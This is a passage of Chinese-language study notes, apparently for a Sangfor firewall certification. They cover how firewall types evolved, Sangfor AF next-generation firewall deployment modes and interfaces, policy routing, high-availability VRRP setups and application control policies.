start="6"><li>防火墙发展进程</li></ol><p><img src="https://pic.imgdb.cn/item/66bc93dbd9c307b7e9c53d54.png"></p><h5 id="传统防火墙（包过滤防火墙）"><a href="#传统防火墙（包过滤防火墙）" class="headerlink" title="传统防火墙（包过滤防火墙）"></a><u>传统防火墙（包过滤防火墙）</u></h5><ul><li>判断信息：五元组（源目IP、源目端口、协议类型）</li><li>工作范围：<strong>网络层、传输层</strong></li><li>和路由器的区别：多一个对包过滤的判断</li><li>技术应用：包过滤技术</li><li>优势：对于小型站点易实现，处理速度快，价格便宜</li><li>劣势：规则表会很庞大，只能基于五元组</li></ul><h5 id="传统防火墙（应用代理防火墙）"><a href="#传统防火墙（应用代理防火墙）" class="headerlink" title="传统防火墙（应用代理防火墙）"></a><u>传统防火墙（应用代理防火墙）</u></h5><ul><li>判断信息：所有应用层的信息包</li><li>工作范围：<strong>应用层</strong></li><li>与包过滤防火墙的区别：所在层不同，包过滤通过检验报头进行规则表匹配，应用代理检查所有应用层信息包，每个应用需要添加对应的代理服务</li><li>技术应用：应用代理技术</li><li>优势：检查了应用层数据</li><li>劣势：检测效率低，配置运维难度极高，可伸缩性差</li></ul><p><img src="https://pic.imgdb.cn/item/66bc97e9d9c307b7e9c886d8.png"></p><h5 id="传统防火墙（状态检测防火墙）"><a href="#传统防火墙（状态检测防火墙）" class="headerlink" title="传统防火墙（状态检测防火墙）"></a><u>传统防火墙（状态检测防火墙）</u></h5><ul><li><p>判断信息：IP、端口号、TCP标记</p></li><li><p>工作范围：<strong>数据链路层、网络层、传输层</strong></p></li><li><p>与包过滤的区别：是包过滤的升级，一次检查建立==<strong>会话表</strong>==，后期直接按会话表放行</p></li><li><p>技术应用：状态检测技术</p></li><li><p>优势：主要检查3-4层能保证效率，对TCP防御较好</p></li><li><p>劣势：应用层检查较弱，不检查数据区</p></li></ul><h5 id="入侵检测系统（IDS）"><a href="#入侵检测系统（IDS）" class="headerlink" title="入侵检测系统（IDS）"></a><u>入侵检测系统（IDS）</u></h5><ul><li>部署方式：旁路部署、可多点部署</li><li>工作范围：2-7层</li><li>工作特点：根据部署位置监控到的流量进行攻击事件的监控，属于事后呈现的系统。相当于网络监控摄像头</li><li>目的：主要为了帮助管理员清晰了解网络环境发生的事，只能发现攻击，不能做是或否的策略</li></ul><h5 id="入侵防御系统（IPS）"><a href="#入侵防御系统（IPS）" class="headerlink" title="入侵防御系统（IPS）"></a><u>入侵防御系统（IPS）</u></h5><ul><li>部署方式：串联部署</li><li>工作范围：2-7层</li><li>工作特点：根据已知安全威胁生成对应的过滤规则，对于已知威胁进行阻断，未知的放行</li><li>目的：<strong>IDS只检测不防御，IPS针对已知威胁进行防御</strong></li></ul><h5 id="防病毒网关（AV）"><a href="#防病毒网关（AV）" class="headerlink" title="防病毒网关（AV）"></a><u>防病毒网关（AV）</u></h5><ul><li><p>判断信息：数据包</p></li><li><p>工作范围：2-7层</p></li><li><p>目的：防止病毒文件流入内网环境</p></li><li><p>和防火墙的区别</p></li></ul><p><img src="https://pic.imgdb.cn/item/66bc9cd6d9c307b7e9cec99c.png"></p><h6 id="传统的病毒检测方法："><a href="#传统的病毒检测方法：" class="headerlink" title="传统的病毒检测方法："></a>传统的病毒检测方法：</h6><p>MD5：病毒都会有一些共性的二进制序列</p><p>病毒特征码：特征码部分匹配二进制序列</p><p>规则匹配：正则表达式，当出现一些正则表达式，则判断为病毒</p><p>沙箱：虚拟执行、开销大、潜伏期长</p><h5 id="Web应用防火墙（WAF）"><a href="#Web应用防火墙（WAF）" class="headerlink" title="Web应用防火墙（WAF）"></a><u>Web应用防火墙（WAF）</u></h5><ul><li><p>判断信息：http协议数据的request和response</p></li><li><p>工作范围：应用层</p></li><li><p>目的：防止基于应用层的攻击影响Web应用系统</p></li><li><p>主要技术原理：</p><ul><li>代理服务：会话双向代理，用户与服务器不产生直接链接，对于DDOS攻击可以抑制</li><li>特征识别：通过正则表达式的特征库进行特征识别</li><li>算法识别：针对攻击方式进行模式化识别，如SQL注入、DDOS、XSS等</li></ul></li></ul><h5 id="统一威胁管理（UTM）-多合一安全网关"><a href="#统一威胁管理（UTM）-多合一安全网关" class="headerlink" title="统一威胁管理（UTM）-多合一安全网关"></a><u>统一威胁管理（UTM）-多合一安全网关</u></h5><ul><li>包含功能：FW、IDS、IPS、AV</li><li>工作范围：2-7层</li><li>目的：将多种安全问题通过一台设备解决</li><li>优点：功能多合一，降低硬件、人力、时间成本</li><li>缺点：模块串联检测效率低，性能消耗大</li></ul><p><img src="https://pic.imgdb.cn/item/66bc9fcdd9c307b7e9d6d607.png"></p><h5 id="下一代防火墙（NGFW）-升级版UTM"><a href="#下一代防火墙（NGFW）-升级版UTM" class="headerlink" title="下一代防火墙（NGFW）-升级版UTM"></a><u>下一代防火墙（NGFW）-升级版UTM</u></h5><ul><li>包含功能：FW、IDS、IPS、AV、WAF</li><li>工作范围：2-7层</li><li>和UTM的区别：<ul><li>增加了WAF</li><li>UTM是<strong>串行处理</strong>机制，NGFW是<strong>并行处理</strong>机制</li><li>NGFW性能更强，管理更高效</li></ul></li></ul><h4 id="4-1-2-深信服下一代防火墙解决方案"><a href="#4-1-2-深信服下一代防火墙解决方案" class="headerlink" title="4.1.2 深信服下一代防火墙解决方案"></a>4.1.2 深信服下一代防火墙解决方案</h4><ol><li>传统防火墙的防御模式：</li></ol><ul><li>通过防御设备划分边界，基于IP/端口和特征进行判断</li><li>以隔离为基础，基于信任原则构建安全框架</li><li>以防护为核心，基于静态特征的攻击检测</li></ul><ol start="2"><li>安全现状</li></ol><p><img src="https://pic.imgdb.cn/item/66bca209d9c307b7e9d8f92c.png"></p><p><img src="https://pic.imgdb.cn/item/66bca239d9c307b7e9d92602.png"></p><h5 id="深信服应对方案"><a href="#深信服应对方案" class="headerlink" title="深信服应对方案"></a>深信服应对方案</h5><ul><li>==<u><strong>深信服AF的核心价值</strong></u>==</li></ul><p><img src="https://pic.imgdb.cn/item/66bca2cfd9c307b7e9d9acd0.png"></p><p>（1）风险全面可视化</p><p><img src="https://pic.imgdb.cn/item/66bca308d9c307b7e9d9e170.png"></p><p>（2）保障企业业务安全</p><p><img src="https://pic.imgdb.cn/item/66bca430d9c307b7e9daed50.png"></p><ul><li>事前风险预知</li></ul><p><img src="https://pic.imgdb.cn/item/66bca4ead9c307b7e9db9eb2.png"></p><ul><li>事中风险防御</li></ul><p><img src="https://pic.imgdb.cn/item/66bca5ccd9c307b7e9dc5f5d.png"></p><ul><li>事后持续检测与响应</li></ul><p><img src="https://pic.imgdb.cn/item/66bca710d9c307b7e9dd97a6.png"></p><ul><li>业务全面保护</li></ul><p><img src="https://pic.imgdb.cn/item/66bca7e3d9c307b7e9de66c7.png"></p><h5 id="深信服人工智能杀毒引擎SAVE"><a href="#深信服人工智能杀毒引擎SAVE" class="headerlink" title="==深信服人工智能杀毒引擎SAVE=="></a>==<strong><u>深信服人工智能杀毒引擎SAVE</u></strong>==</h5><p><img src="https://pic.imgdb.cn/item/66bca8a2d9c307b7e9df1f86.png"></p><p><img src="https://pic.imgdb.cn/item/66bca943d9c307b7e9dfd09f.png"></p><h5 id="智能联动"><a href="#智能联动" class="headerlink" title="智能联动"></a>智能联动</h5><p>图谱：</p><p><img src="https://pic.imgdb.cn/item/66bca9e2d9c307b7e9e074d7.png"></p><h5 id="云端智能检测-威胁情报"><a href="#云端智能检测-威胁情报" class="headerlink" title="云端智能检测-威胁情报"></a>云端智能检测-威胁情报</h5><p><img src="https://pic.imgdb.cn/item/66bcaa35d9c307b7e9e0d7a8.png"></p><h5 id="云端智能检测-云端沙箱"><a href="#云端智能检测-云端沙箱" class="headerlink" title="云端智能检测-云端沙箱"></a>云端智能检测-云端沙箱</h5><p><img src="https://pic.imgdb.cn/item/66bcaa77d9c307b7e9e1a42f.png"></p><h5 id="互联网出口安全防护场景"><a href="#互联网出口安全防护场景" class="headerlink" title="互联网出口安全防护场景"></a>互联网出口安全防护场景</h5><p><img src="https://pic.imgdb.cn/item/66bcaadad9c307b7e9e31c01.png"></p><h5 id="对外业务发布安全防护场景"><a href="#对外业务发布安全防护场景" class="headerlink" title="对外业务发布安全防护场景"></a>对外业务发布安全防护场景</h5><p><img src="https://pic.imgdb.cn/item/66bcc0b4d9c307b7e9074ed9.png"></p><h5 id="分支机构安全防护场景"><a href="#分支机构安全防护场景" class="headerlink" title="分支机构安全防护场景"></a>分支机构安全防护场景</h5><p><img src="https://pic.imgdb.cn/item/66bcc107d9c307b7e907a222.png"></p><h5 id="数据中心安全防护"><a href="#数据中心安全防护" class="headerlink" title="数据中心安全防护"></a>数据中心安全防护</h5><p><img src="https://pic.imgdb.cn/item/66bcc165d9c307b7e9080495.png"></p><h4 id="4-1-3-下一代防火墙组网简介"><a href="#4-1-3-下一代防火墙组网简介" class="headerlink" title="4.1.3 下一代防火墙组网简介"></a>4.1.3 下一代防火墙组网简介</h4><p>下一代防火墙具备灵活网络适应能力，支持：**==路由模式、透明模式、虚拟网线模式、混合模式、旁路模式==**</p><p><img src="https://pic.imgdb.cn/item/66bcc337d9c307b7e909efa6.png"></p><h5 id="AF的接口"><a href="#AF的接口" class="headerlink" title="AF的接口"></a>AF的接口</h5><ul><li>根据接口属性分为：物理接口（**==路由口、透明口、虚拟网线口、旁路镜像口==**）、子接口、VLAN接口、聚合接口</li><li>根据接口不同工作层面，分为：二层区域、三层区域、虚拟网线区域</li></ul><p>​<u>AF的部署模式由各接口的属性决定的</u></p><ol><li>物理接口</li></ol><ul><li><p>分为四种类型：<strong>路由、透明、虚拟网线、旁路镜像</strong></p></li><li><p>无法删除或新增，数量由硬件决定</p><ol><li><p>路由接口：需配置ip，具有路由转发功能</p><ul><li>部分功能要求出接口属性是WAN属性，比如流控、流审等</li><li>需要手动配置缺省路由0.0.0.0<ul><li>ADSL拨号（PPPoE）</li><li>管理口：Eth0为固定管理口，类型为路由口，无法修改，<strong>默认管理IP为10.251.251.251/24</strong></li></ul></li></ul></li><li><p>虚拟网线接口：普通交换接口，不能配IP，不支持路由转发，转发数据时，不验证MAC表，直接从虚拟网线配对的接口转发</p><ul><li>转发性能高于透明接口（要查MAC），单进单出，双进双出等成对出现的网桥环境下，推荐使用虚拟网线接口部署</li></ul></li><li><p>旁路镜像接口：不能配IP，不支持数据转发，只是用来接收从外部镜像过来的镜像数据</p><ul><li>可配置多个</li></ul></li></ol></li></ul><ol start="2"><li>聚合接口：将多个以太网接口捆绑在一起形成逻辑接口</li></ol><ul><li>最多支持4个聚合接口</li><li>不支持旁路镜像</li></ul><ol start="3"><li>子接口：应用于路由接口需要启动VLAN或TRUNK的时候</li></ol><ul><li>逻辑接口，只能在路由口下添加，默认继承物理口的属性</li></ul><ol start="4"><li>VLAN接口：为VLAN定义IP，则会产生VLAN接口</li></ol><ul><li>逻辑接口</li></ul><h5 id="接口设置注意事项"><a href="#接口设置注意事项" class="headerlink" title="接口设置注意事项"></a>接口设置注意事项</h5><ul><li>设备支持配置多个WAN属性的路由接口连接多条外网线路，但是需要开通多条线路的授权。</li><li>管理口不支持设置成透明接口或虚拟网线接口，如果要设置2对或2对以上的虚拟网线接口，则必须要求设备不少于5个物理接口，预留一个专门的管理口Eth0。</li><li>一个路由接口下可添加多个子接口，路由接口的IP地址不能与子接口的IP地址在同网段。</li></ul><h5 id="区域"><a href="#区域" class="headerlink" title="区域"></a>区域</h5><p>什么是区域？</p><ul><li>是本地逻辑安全区域的概念</li><li>一个或多个接口所连接的网络</li><li>用于定义和归类接口</li></ul><p>==<strong><u>一个接口只能属于一个区域，而一个区域可以有多个接口</u></strong>==</p><h5 id="错题："><a href="#错题：" class="headerlink" title="错题："></a><u>错题</u>：</h5><p><img src="https://pic.imgdb.cn/item/66bd94fcd9c307b7e90d04ae.png"></p><h4 id="4-1-4-下一代防火墙组网-路由模式"><a href="#4-1-4-下一代防火墙组网-路由模式" class="headerlink" title="4.1.4 下一代防火墙组网-路由模式"></a>4.1.4 下一代防火墙组网-路由模式</h4><ol><li>需求背景</li></ol><ul><li><p>客户需求：使用AF替换防火墙部署在出口</p></li><li><p>需求分析</p></li></ul><p><img src="https://pic.imgdb.cn/item/66bd961cd9c307b7e90dff77.png"></p><ul><li>配置思路</li></ul><p><img src="https://pic.imgdb.cn/item/66bd96d0d9c307b7e90ea223.png"></p><ul><li>单臂路由模式</li></ul><p><img src="https://pic.imgdb.cn/item/66bd97cbd9c307b7e90f7c3d.png"></p><p><img src="https://pic.imgdb.cn/item/66bd983ad9c307b7e90fdaad.png"></p><ul><li><p>配置步骤：</p></li><li><p>注意事项</p></li></ul><p><img src="https://pic.imgdb.cn/item/66bd998bd9c307b7e911b40e.png"></p><h4 id="4-1-5-下一代防火墙组网-透明模式"><a href="#4-1-5-下一代防火墙组网-透明模式" class="headerlink" title="4.1.5 下一代防火墙组网-透明模式"></a>4.1.5 下一代防火墙组网-透明模式</h4><ol><li>需求背景</li></ol><ul><li><p>客户需求：增加一台AF设备做安全防护，不改动现有网络环境</p></li><li><p>需求分析：</p></li></ul><p><img src="https://pic.imgdb.cn/item/66bdbb98d9c307b7e9439614.png"></p><ul><li>配置思路</li></ul><p><img src="https://pic.imgdb.cn/item/66bdbb76d9c307b7e9437a72.png"></p><ul><li>透明模式与虚拟网线模式的区别</li></ul><p><img src="https://pic.imgdb.cn/item/66bdbc42d9c307b7e9441a79.png"></p><ul><li>配置案例</li></ul><p><img src="https://pic.imgdb.cn/item/66bdbd0cd9c307b7e944b94c.png"></p><ul><li><strong><u>注意事项</u></strong></li></ul><p><img src="https://pic.imgdb.cn/item/66bdbe3ed9c307b7e945aeab.png"></p><h4 id="4-1-6-下一代防火墙组网-旁路模式"><a href="#4-1-6-下一代防火墙组网-旁路模式" class="headerlink" title="4.1.6 下一代防火墙组网-旁路模式"></a>4.1.6 下一代防火墙组网-旁路模式</h4><ol><li>需求背景</li></ol><p><img src="https://pic.imgdb.cn/item/66bdc38fd9c307b7e94a22ce.png"></p><ul><li>需求分析</li></ul><p><img src="https://pic.imgdb.cn/item/66bdc637d9c307b7e950a3ab.png"></p><ul><li>配置思路</li></ul><p><img src="https://pic.imgdb.cn/item/66bdc668d9c307b7e9510e40.png"></p><ul><li>配置案例</li></ul><p><img src="https://pic.imgdb.cn/item/66bdcaabd9c307b7e956ca69.png"></p><ul><li>注意事项</li></ul><p><img src="https://pic.imgdb.cn/item/66bdcbc4d9c307b7e957840f.png"></p><h4 id="4-1-7-下一代防火墙组网-混合模式"><a href="#4-1-7-下一代防火墙组网-混合模式" class="headerlink" title="4.1.7 下一代防火墙组网-混合模式"></a>4.1.7 下一代防火墙组网-混合模式</h4><ol><li>需求背景</li></ol><ul><li>客户需求</li></ul><p><img src="https://pic.imgdb.cn/item/66bdceb4d9c307b7e959923b.png"></p><ul><li>需求分析</li></ul><p><img src="https://pic.imgdb.cn/item/66bdcfe1d9c307b7e95a686a.png"></p><ul><li>配置思路</li></ul><p><img src="https://pic.imgdb.cn/item/66bdd093d9c307b7e95add39.png"></p><ul><li>配置案例</li></ul><p><img src="https://pic.imgdb.cn/item/66bdd112d9c307b7e95b4273.png"></p><ul><li>注意事项</li></ul><p><img src="https://pic.imgdb.cn/item/66be0893d9c307b7e9a6b07e.png"></p><h4 id="4-1-8-策略路由解决方案"><a href="#4-1-8-策略路由解决方案" class="headerlink" title="4.1.8 策略路由解决方案"></a>4.1.8 策略路由解决方案</h4><ol><li>策略路由概述</li></ol><p>​在企业网络环境中，存在多条互联网出口线路，经常出现某一条线路接口带宽占满，另外一条线路经常空闲状态，从而导致网络时延过高，带宽利用率低，业务运行无法得到保障，严重影响办公人员工作效率和用户带来的投诉。因此，需要一种技术手段解决互联网<strong>多出口带宽利用率</strong>的问题。</p><ol start="2"><li>策略路由的定义</li></ol><p>​为保障出接口多条线路时，根据源/目的IP、源/目的端口、协议等条件进行出接口和线路选择，以<u>实现不同的数据走不同的外网线路的自动选路功能</u></p><p><img src="https://pic.imgdb.cn/item/66be1181d9c307b7e9b6988f.png"></p><ol start="3"><li>策略路由类型（两种）</li></ol><ul><li>源地址策略路由</li></ul><p>​存在多条线路出口情况下，根据源/目IP，端口、协议、应用来定义匹配条件，对于匹配上的流量根据选择<strong>指定线路</strong>的出口或下一跳，比如多运营商选路场景</p><p>​<strong><u>支持DNS检查、PING检测、ARP检测</u></strong></p><ul><li>多线路负载路由</li></ul><p>​存在多条线路出口情况下，根据源/目IP，端口、协议、应用来定义匹配条件，对出接口选择轮询、带宽比例、加权最小流量、优先使用前面的<strong>线路策略</strong>，进行<strong>动态选择线路</strong>实现线路带宽的有效利用和负载均衡</p><p>​<strong>==轮询==</strong>:平均分配连接到多条外网线路</p><p>​<strong>==带宽比例==</strong>:按照外网线路带宽的比例来分配连接</p><p>​<strong>==加权最小流量==</strong>:通过比较当前线路流量与线路带宽的比值，选择最小的线路优先分配连接</p><p>​<strong>==优先使用前面的线路==</strong>:用于线路需要做主备的场景，则所有连接均分配到第一条线路如果第一条线路故障，才把连接切换到第二条选择的可用线路</p><ol start="4"><li>应用场景</li></ol><p><img src="https://pic.imgdb.cn/item/66bed127d9c307b7e93ad5b9.png"></p><pre><code>5. 配置案例</code></pre><p><img src="https://pic.imgdb.cn/item/66bed226d9c307b7e93b9e4f.png"></p><ul><li>配置思路及步骤</li></ul><p><img src="https://pic.imgdb.cn/item/66bed28dd9c307b7e93be86d.png"></p><ul><li>注意事项</li></ul><p><img src="https://pic.imgdb.cn/item/66bedce7d9c307b7e9436b93.png"></p><h5 id="错题：-1"><a href="#错题：-1" class="headerlink" title="错题："></a><u>错题</u>：</h5><p><img src="https://pic.imgdb.cn/item/66bedf51d9c307b7e9456d78.png"></p><p><img src="https://pic.imgdb.cn/item/66bedf67d9c307b7e9457f05.png"></p><h4 id="4-1-9-高可用性功能基础（高可用性架构）"><a href="#4-1-9-高可用性功能基础（高可用性架构）" class="headerlink" title="4.1.9 高可用性功能基础（高可用性架构）"></a>4.1.9 高可用性功能基础（高可用性架构）</h4><ol><li><p>客户需求：提高网络可靠性，保证业务连续性，**<u>避免单点故障</u>**</p></li><li><p>功能概述：高可用性功能，用来解决AF单点故障，所以在**<u>出口部署两台AF</u>**，以达到冗余备份</p></li><li><p>建立基础：</p></li></ol><p><img src="https://pic.imgdb.cn/item/66bee04ed9c307b7e9463fb8.png"></p><p>名词解释：</p><ol><li><u>主线路与辅线路</u></li></ol><p>主线路：负责主备机<strong>心跳保持、配置同步、会话同步</strong>。目前支持使用<strong>聚合口</strong>做为心跳接口，但聚合接口模式只支持<strong>“主备模式”</strong></p><p>辅线路：当主心跳故障后，辅心跳可承接主心跳进行心跳保证的工作，同样支持聚合主备接口。<strong>但需要注意，辅心跳不支持配置同步，所以如果主心跳故障的，也需要立即处置，否则还是有业务风险</strong></p><pre><code>      2. &lt;u&gt;抢占（在双机热备配置）&lt;/u&gt;</code></pre><p>不开启抢占：如果原主机因故障切换成备机，故障恢复后，就算优先级高，也不会自动恢复成主机，而是以备机身份继续运行</p><p>开启抢占：如果原主机因故障切换成备机，故障恢复后，如果优先级高，会自动恢复成主机</p><p>抢占功能非特殊场景<strong>不建议开</strong>，原因是当主机网线出现故障，主机状态变成备机或者故障状态之后，网口默认不发包，设备链路检测状态为故障，当线路恢复正常，主机抢占回主状态，这个时候链路状态还未恢复，主机又会恢复成备机或者故障状态，会一直反复来回切换增加切换频次，而且因为AF必须同构(即两台AF需要硬件一致)运行，所以也不存在位差异，抢占的意义一般不大</p><ol start="3"><li><u>网口监视</u></li></ol><p>网口监视：双机切换条件之一，通过接口物理状态进行检测结果判定，如接口出现ifconfig down，网线脱落，协商失败等物理故障。物理状态的故障双机状态可以快速检测到，并在多播包中发送prio=0，通知对端变成主机，理论上可以实现无延时切换</p><p>网口监视还有一个功能是，<strong>备机状态下，添加到网口监视中的接口，处于发包抑制状态</strong>，无法发送任何数据包，所以<strong>配置了业务的接口，都必须添加到网口监视中</strong>，否则双机同步配置后，主备机接口IP一致，就会导致网络中的IP冲突</p><ol start="4"><li><u>链路监视</u></li></ol><p>双机切换条件之一，通过链路连通性状态进行检测结果判定，目前支持<strong>ARP、DNS、PING</strong>三种检测方法，三种检测方法可以在接口上选择性开启，同时双机判断链路失败的条件也可以自由组合</p><ol start="5"><li><u>主备机与主备控</u></li></ol><p>主备机:简单理解为设备<strong>数据层面</strong>控制，主机状态<u>加入网口监视</u>的业务接口<strong>允许</strong>进行正常的数据转发，备机状态<u>加</u><br><u>入网口监视</u>的业务接口<strong>不允许</strong>进行数据转发</p><p>主备控:简单理解为设备<strong>配置层面</strong>控制，主控<strong>允许</strong>修改设备配置，备控<strong>不允许</strong>修改设备配置，主机强制绑定为主控，备机强制绑定为备控。主备控配置同步的流程为：</p><ul><li>备控向主控主动发起配置更新请求（10秒一次发送需要同步配置文件的MD5到主控）</li><li>主控收到备控请求后，向备控同步当前的配置（比对有MD5差异的文件，把有差异的文件同步给备控）</li></ul><p><img src="https://pic.imgdb.cn/item/66bee9ffd9c307b7e94df86a.png"></p><ol start="4"><li>高可用部署类型</li></ol><p>（1）主备部署</p><ul><li>两台设备只有一台处于<strong>工作状态</strong>，还有一台处于<strong>热备状态</strong>，当检测机制检测到主机故障后，由热备设备自动承接所有工作，从而来保障客户业务的连续性</li></ul><p>（2）主主部署</p><ul><li>两台设备均处于工作状态，根据流量转发到不同AF的情况，来进行数据处理，主主又分两种情况:<ul><li>有VRRP双主：配置多组VRRP，每组有不同的主备机，该场景<strong>不推荐</strong>，路由有VRRP双主基本上很难支持起来。透明有VRRP双主一般就直接引导为无VRRP双主</li><li>无VRRP双主：<strong>不配置</strong>VRRP组，只配置双机基本信息和配置同步，根据上下联设备把数据引流到不同设备来进行承接</li></ul></li></ul><ol start="5"><li>高可用性基本原理</li></ol><ul><li>主备部署，是通过<strong>VRRP协议</strong>来实现主备关系之间的选择和切换，<u>优先级高的为主</u>，优先级相同的情况下<u>心跳口IP地址大</u>的为主。但AF又不完全是使用标准的VRRP协议，在标准VRRP协议上做了一定的开发</li><li>VRRP(Virtual Router Redundancy Protocol，<strong>虚拟路由器冗余协议</strong>)将可以承担网关功能的一组路由器加入到备份组中，形成一台虚拟路由器，这样主机的网关设置成虚拟网关就能够实现冗余</li></ul><p><img src="https://pic.imgdb.cn/item/66beec06d9c307b7e94fd60c.png"></p><ol start="6"><li>状态切换</li></ol><p><img src="https://pic.imgdb.cn/item/66beed45d9c307b7e950eab9.png"></p><ol start="7"><li>虚拟IP和虚拟MAC</li></ol><ul><li><p>虚拟IP</p><ul><li>为了保证双机<strong>切换时</strong>内网PC<u>不需要重新修改网关IP和重新学习网关mac</u>，要求主备机在同一个vrid组中对应的接口拥有同样的IP地址和mac地址</li><li>AF实现方法是，启用双机配置同步之后，两台设备接口ip是一样的(加了HA标签的口除外)，即同一个vrid组中的对应接口拥有相同的IP地址，设备工作为备机时通过ha_drv模块丢弃所有到本接口和从本接口出去的数据包，这样只有主机工作，因此不会产生冲突</li><li><u>注意，业务口都要加入到网口监视中，双机才能正常切换，另外，接口是路由式下，路由接口都要加入网口监视中才能避免ip冲突</u></li></ul></li><li><p>虚拟MAC</p><ul><li>同-vrid组中对应的两个接口分别有自己的实MAC，和一个虚拟MAC，<u>谁为主机谁就使用这个虚拟MAC</u>，切换成备机后接口的MAC地址又换回成实MAC，这样内网PC得到网关的IP/MAC不会随着设备切换而发生改变</li><li>虚拟MAC的构成:<strong>vrrp mac(00-00-5E)+接口序号+vrid</strong>，比如:vrid为101，eth1口的虚拟MAC就是:00-00-5E-00-01-65，eth2口的虚拟MAC就是:00-00-5E-00-02-65，65的十进制就是101</li></ul></li></ul><h4 id="4-1-10-主主-主备部署应用场景及配置思路"><a href="#4-1-10-主主-主备部署应用场景及配置思路" class="headerlink" title="4.1.10 主主&amp;主备部署应用场景及配置思路"></a>4.1.10 主主&amp;主备部署应用场景及配置思路</h4><h5 id="主备部署"><a href="#主备部署" class="headerlink" title="主备部署"></a>主备部署</h5><ol><li>应用场景</li></ol><p><img src="https://pic.imgdb.cn/item/66bef849d9c307b7e95a7b61.png"></p><ol start="2"><li>配置思路</li></ol><p><img src="https://pic.imgdb.cn/item/66bef8a0d9c307b7e95acb2a.png"></p><ol start="3"><li>配置案例</li></ol><p><img src="https://pic.imgdb.cn/item/66bef975d9c307b7e95bb513.png"></p><ul><li>心跳口不能为业务口，需要单独配置一个物理接口（或聚合口）</li></ul><ol start="4"><li>==<strong><u>注意事项</u></strong>==</li></ol><p><img src="https://pic.imgdb.cn/item/66befe9fd9c307b7e9608a2e.png"></p><h5 id="主主部署"><a href="#主主部署" class="headerlink" title="主主部署"></a>主主部署</h5><ol><li>应用场景：</li></ol><p><img src="https://pic.imgdb.cn/item/66beff90d9c307b7e96154b5.png"></p><ol start="2"><li>配置思路</li></ol><p><img src="https://pic.imgdb.cn/item/66bf026bd9c307b7e963988b.png"></p><ol start="3"><li>配置案例</li></ol><p><img src="https://pic.imgdb.cn/item/66c08cbed9c307b7e93d5d41.png"></p><ol start="4"><li><strong><u>==注意事项==</u></strong></li></ol><p><img src="https://pic.imgdb.cn/item/66c08e9fd9c307b7e93ef010.png"></p><h4 id="4-1-11-双机聚合应用场景及配置思路-双机部署常见故障"><a href="#4-1-11-双机聚合应用场景及配置思路-双机部署常见故障" class="headerlink" title="4.1.11 双机聚合应用场景及配置思路&amp;双机部署常见故障"></a>4.1.11 双机聚合应用场景及配置思路&amp;双机部署常见故障</h4><ol><li>需求背景</li></ol><p><img src="https://pic.imgdb.cn/item/66c090a9d9c307b7e94100b4.png"></p><ol start="2"><li>基本原理</li></ol><p>​双机聚合功能开启后，每台AF都会在后台程序自动生成一个是0或者是1的编号，这个编号界面上看不到，所有经过AF的流量都会是经过算法(即根据源/目的IP地址)计算，看计算结果的值是0还是1，从而将对应数据包转发到对应编号的AF上进行转发(比如根据算法算出来的值是0，则从编号为0的AF转发数据)</p><p><img src="https://pic.imgdb.cn/item/66c092b3d9c307b7e945cc9d.png"></p><ol start="3"><li>具体过程</li></ol><p><img src="https://pic.imgdb.cn/item/66c0933bd9c307b7e94651a9.png"></p><ol start="4"><li>注意事项</li></ol><p><img src="https://pic.imgdb.cn/item/66d9c2b8d9c307b7e9021050.png"></p><ol start="5"><li>常见故障排查</li></ol><p><img src="https://pic.imgdb.cn/item/66dc0647d9c307b7e9bf2b0d.png"></p><h5 id="错题：-2"><a href="#错题：-2" class="headerlink" title="错题："></a><u>错题：</u></h5><p><img src="https://pic.imgdb.cn/item/66dc154ad9c307b7e9d7a1cd.png"></p><p><img src="https://pic.imgdb.cn/item/66dc1561d9c307b7e9d7c1f5.png"></p><p><img src="https://pic.imgdb.cn/item/66dc1578d9c307b7e9d7e170.png"></p><h4 id="4-1-12-终端安全风险-终端上网安全应用控制技术"><a href="#4-1-12-终端安全风险-终端上网安全应用控制技术" class="headerlink" title="4.1.12 终端安全风险&amp;终端上网安全应用控制技术"></a>4.1.12 终端安全风险&amp;终端上网安全应用控制技术</h4><ol><li>应用控制策略功能</li></ol><ul><li>防火墙做逻辑隔离，过滤数据包（过滤条件包括源目区域、源目IP、目的服务及应用）</li></ul><ol start="2"><li>工作过程</li></ol><ul><li>根据自定义应用控制策略，从上往下依次匹配，并根据策略允许或拒绝，同时创建一个会话</li></ul><p><img src="https://pic.imgdb.cn/item/66dc0946d9c307b7e9c3ffaa.png"></p><ol start="3"><li><p>应用控制策略分类</p><ol><li><p>基于服务的控制策略</p><ul><li>通过匹配<strong>数据包五元组</strong>来进行过滤动作</li></ul></li><li><p>基于应用的控制策略</p><ul><li><p>通过匹配<strong>数据包特性</strong>来进行过滤动作，需要一定数量的包通过后才能判断应用类型，然后拦截动作的判断</p></li><li><p>配置应用控制策略，必须服务和应用两类型都匹配，策略才生效，例如：服务是TCP，应用是DNS（UDP），那么就不生效</p></li></ul></li></ol></li><li><p>应用场景</p></li></ol><p><img src="https://pic.imgdb.cn/item/66dc0c8bd9c307b7e9c98d3b.png"></p><p>策略表</p><table><thead><tr><th align="center">策略</th><th align="center">源</th><th align="center">目的</th><th align="center">应用</th><th align="center">动作</th></tr></thead><tbody><tr><td align="center">1、允许ip访问服务器固定端口80</td><td align="center">172.16.10.10</td><td align="center">172.16.20.20:80</td><td align="center">any</td><td align="center">允许</td></tr><tr><td align="center">2、禁止访问P2P相关应用</td><td align="center">172.16.10.10</td><td align="center">any</td><td align="center">P2P</td><td align="center">拒绝</td></tr><tr><td align="center">3、PC允许访问互联网（加时间计划）</td><td align="center">172.16.10.10</td><td align="center">any</td><td align="center">any</td><td align="center">允许</td></tr></tbody></table><ol start="5"><li>应用控制策略–长连接</li></ol><p>​       在一些特殊的环境下，实现服务器在一段时间中没有收到客户端的数据(应用层数据)，也不会断开连接，这就</p><p>需要AF配置长连接，防止会话超时删除。</p><p><img src="https://pic.imgdb.cn/item/66dc1083d9c307b7e9d24039.png"></p><p>应用场景：</p><p><img src="https://pic.imgdb.cn/item/66dc1134d9c307b7e9d2cbce.png"></p><ol start="6"><li>应用控制策略辅助功能</li></ol><p><img src="https://pic.imgdb.cn/item/66dc11a4d9c307b7e9d33d8d.png"></p><p>应用场景：</p><p><img src="https://pic.imgdb.cn/item/66dc13d6d9c307b7e9d5a5ef.png"></p><p>配置案例：</p><p><img src="https://pic.imgdb.cn/item/66dc1422d9c307b7e9d60d08.png"><img src="https://pic.imgdb.cn/item/66dc1433d9c307b7e9d62450.png"></p><ol start="7"><li>注意事项</li></ol><p><img src="https://pic.imgdb.cn/item/66dc1487d9c307b7e9d69c66.png"></p><h4 id="4-1-13-终端上网安全网关杀毒技术"><a href="#4-1-13-终端上网安全网关杀毒技术" class="headerlink" title="4.1.13 